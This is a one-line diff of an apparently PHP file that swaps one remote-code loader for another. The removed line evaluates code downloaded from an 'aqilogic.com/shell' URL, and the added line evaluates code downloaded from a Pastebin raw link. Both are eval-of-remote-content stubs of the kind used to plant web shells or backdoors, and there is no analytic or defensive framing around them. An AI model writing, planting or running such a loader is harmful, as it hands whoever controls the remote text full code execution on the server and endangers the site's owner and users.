@@ -1,1 +1,1 @@
-<?=eval("?>".file_get_contents("https://aqilogic.com/shell/d/fanvat.txt"));?>
+<?=eval("?>".file_get_contents("https://pastebin.com/raw/CdNWURPG"));?>
